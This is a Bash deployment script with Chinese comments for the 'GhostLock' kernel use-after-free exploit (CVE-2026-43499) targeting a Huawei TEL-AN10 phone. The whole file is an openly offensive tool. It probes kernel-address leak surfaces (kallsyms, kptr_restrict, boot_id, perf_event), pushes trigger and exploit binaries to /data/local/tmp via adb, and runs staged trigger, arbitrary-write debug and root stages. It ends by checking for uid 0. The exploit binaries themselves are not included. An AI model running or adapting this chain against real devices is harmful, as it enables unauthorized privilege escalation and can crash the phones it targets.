#!/bin/bash
# ============================================================
#  GhostLock (CVE-2026-43499) - HUAWEI TEL-AN10 (4.14) Root 部署脚本
#
#  用法:
#    ./root.sh info      - 设备信息与环境检查 (kallsyms/boot_id/perf)
#    ./root.sh deploy    - 推送二进制到 /data/local/tmp
#    ./root.sh trigger   - 运行 trigger 验证漏洞 (⚠️ 可能 panic 重启手机)
#    ./root.sh debug     - 运行 exploit 调试模式 (写特征值, ⚠️ 可能 panic)
#    ./root.sh root      - 运行 exploit 提权模式 (ROOT)
#    ./root.sh verify    - 验证 root 状态
#
#  可选环境变量: SERIAL=设备序列号 (多设备时)
# ============================================================
set -u

ADB="${ADB:-adb}"
SERIAL_OPTS=""
if [ -n "${SERIAL:-}" ]; then
  SERIAL_OPTS="-s $SERIAL"
fi

BIN_DIR="$(cd "$(dirname "$0")" && pwd)"
TRIGGER="$BIN_DIR/ghostlock_trigger"
EXPLOIT="$BIN_DIR/ghostlock_exploit"
DEV_DIR="/data/local/tmp"

say()  { echo -e "\033[1;34m[*]\033[0m $*"; }
good() { echo -e "\033[1;32m[+]\033[0m $*"; }
warn() { echo -e "\033[1;33m[!]\033[0m $*"; }
fail() { echo -e "\033[1;31m[-]\033[0m $*"; }

require_adb() {
  command -v "$ADB" >/dev/null 2>&1 || { fail "找不到 adb, 请安装 platform-tools"; exit 1; }
}

check_device() {
  local out
  out=$($ADB $SERIAL_OPTS get-state 2>&1) || { fail "设备未连接 (adb get-state: $out)"; exit 1; }
  good "设备状态: $out"
}

stage_info() {
  require_adb; check_device
  say "===== 设备信息 ====="
  $ADB $SERIAL_OPTS shell getprop ro.build.version.release
  $ADB $SERIAL_OPTS shell getprop ro.build.fingerprint
  $ADB $SERIAL_OPTS shell getprop ro.product.model
  say "===== 内核版本 ====="
  $ADB $SERIAL_OPTS shell 'cat /proc/version'
  say "===== 内核启动命令 ====="
  $ADB $SERIAL_OPTS shell 'cat /proc/cmdline'
  say "===== kallsyms 可读性 (地址非 0 才可用) ====="
  $ADB $SERIAL_OPTS shell 'head -3 /proc/kallsyms'
  say "===== kptr_restrict ====="
  $ADB $SERIAL_OPTS shell 'cat /proc/sys/kernel/kptr_restrict 2>/dev/null'
  say "===== boot_id 可读性 (KASLR 泄漏面) ====="
  $ADB $SERIAL_OPTS shell 'cat /proc/sys/kernel/random/boot_id'
  say "===== perf_event 可用性 (完整链需要) ====="
  $ADB $SERIAL_OPTS shell 'cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null'
  say "===== SELinux 状态 ====="
  $ADB $SERIAL_OPTS shell 'getenforce'
  say "===== 当前 Boot ID ====="
  $ADB $SERIAL_OPTS shell 'cat /proc/sys/kernel/random/boot_id'
}

stage_deploy() {
  require_adb; check_device
  [ -f "$TRIGGER" ] || { fail "缺少 $TRIGGER, 先 make"; exit 1; }
  [ -f "$EXPLOIT" ] || { fail "缺少 $EXPLOIT, 先 make"; exit 1; }
  say "推送 $TRIGGER -> $DEV_DIR/"
  $ADB $SERIAL_OPTS push "$TRIGGER" "$DEV_DIR/ghostlock_trigger" || exit 1
  say "推送 $EXPLOIT -> $DEV_DIR/"
  $ADB $SERIAL_OPTS push "$EXPLOIT" "$DEV_DIR/ghostlock_exploit" || exit 1
  $ADB $SERIAL_OPTS shell "chmod 755 $DEV_DIR/ghostlock_trigger $DEV_DIR/ghostlock_exploit"
  good "部署完成"
  $ADB $SERIAL_OPTS shell "ls -la $DEV_DIR/ghostlock_trigger $DEV_DIR/ghostlock_exploit"
}

wait_reconnect() {
  # 等待设备重新上线 (trigger/exploit 可能 panic 导致重启)
  local timeout=300 i=0
  say "等待设备重新上线 (最长 ${timeout}s)..."
  while [ $i -lt $timeout ]; do
    if $ADB $SERIAL_OPTS get-state >/dev/null 2>&1; then
      good "设备已重新上线"
      return 0
    fi
    sleep 2; i=$((i+2))
  done
  fail "设备未在 ${timeout}s 内重新上线"
  return 1
}

run_on_device() {
  local name="$1" bin="$2" tmo="$3"
  local boot_before boot_after
  boot_before=$($ADB $SERIAL_OPTS shell 'cat /proc/sys/kernel/random/boot_id' 2>/dev/null | tr -d '\r')
  say "运行 $name (超时 ${tmo}s)... BootID=$boot_before"
  timeout "$tmo" $ADB $SERIAL_OPTS shell "$bin 2>&1; echo RC=\$?"
  local rc=$?
  if [ $rc -eq 124 ]; then
    warn "$name 超时 (设备可能已重启或挂起)"
  else
    say "$name 退出 (host rc=$rc)"
  fi
  if ! $ADB $SERIAL_OPTS get-state >/dev/null 2>&1; then
    warn "设备离线 - 疑似 panic 重启, 等待恢复..."
    wait_reconnect || return 1
  fi
  boot_after=$($ADB $SERIAL_OPTS shell 'cat /proc/sys/kernel/random/boot_id' 2>/dev/null | tr -d '\r')
  if [ -n "$boot_before" ] && [ -n "$boot_after" ] && [ "$boot_before" != "$boot_after" ]; then
    warn "BootID 变化: $boot_before -> $boot_after (设备已重启)"
  else
    good "BootID 未变: $boot_before"
  fi
  return 0
}

stage_trigger() {
  require_adb; check_device
  say "确认: trigger 会触发内核 UAF, 若内核存在漏洞则 panic 重启手机"
  if [ "${CONFIRM:-}" != "yes" ]; then
    warn "输入 CONFIRM=yes 确认后执行, 例如: CONFIRM=yes ./root.sh trigger"
    exit 1
  fi
  run_on_device "trigger" "$DEV_DIR/ghostlock_trigger" 60
  say "trigger 结论判断:"
  say "  - 设备 panic 重启  -> 漏洞存在 (符合预期)"
  say "  - 输出 'UAF probe returned' -> 内核可能已修补"
}

stage_debug() {
  require_adb; check_device
  if [ "${CONFIRM:-}" != "yes" ]; then
    warn "debug 模式会写入特征值 0xdead0000dead0000, 可能 panic 重启手机"
    warn "输入 CONFIRM=yes 确认后执行"
    exit 1
  fi
  run_on_device "exploit(debug)" "$DEV_DIR/ghostlock_exploit" 120
  say "debug 结论判断:"
  say "  - panic 地址包含 0xdead -> 任意写原语验证成功"
  say "  - 无 panic -> 需调整 TYPE_FOR_RB_LEFT / 延迟 / 目标符号"
}

stage_root() {
  require_adb; check_device
  if [ "${CONFIRM:-}" != "yes" ]; then
    warn "root 模式: 需要先在 exploit.c 设置 DEBUG_MODE=0 并重新编译!"
    warn "输入 CONFIRM=yes 确认后执行"
    exit 1
  fi
  run_on_device "exploit(root)" "$DEV_DIR/ghostlock_exploit" 180
  stage_verify
}

stage_verify() {
  require_adb; check_device
  say "===== 验证 root ====="
  $ADB $SERIAL_OPTS shell 'id'
  local uid
  uid=$($ADB $SERIAL_OPTS shell 'id -u' 2>/dev/null | tr -d '\r')
  if [ "$uid" = "0" ]; then
    good "uid=0 - ROOT 成功!"
    $ADB $SERIAL_OPTS shell 'getenforce'
    say "尝试开启 root shell: adb shell"
    say "注意: root 是临时的, 重启后失效"
  else
    fail "uid=$uid - 尚未获得 root"
  fi
}

stage_all() {
  stage_info
  stage_deploy
  warn "请手动分阶段执行: trigger -> debug -> root (每步都可能重启手机)"
}

case "${1:-all}" in
  info)    stage_info ;;
  deploy)  stage_deploy ;;
  trigger) stage_trigger ;;
  debug)   stage_debug ;;
  root)    stage_root ;;
  verify)  stage_verify ;;
  all)     stage_all ;;
  *) echo "用法: $0 {info|deploy|trigger|debug|root|verify|all}"; exit 1 ;;
esac
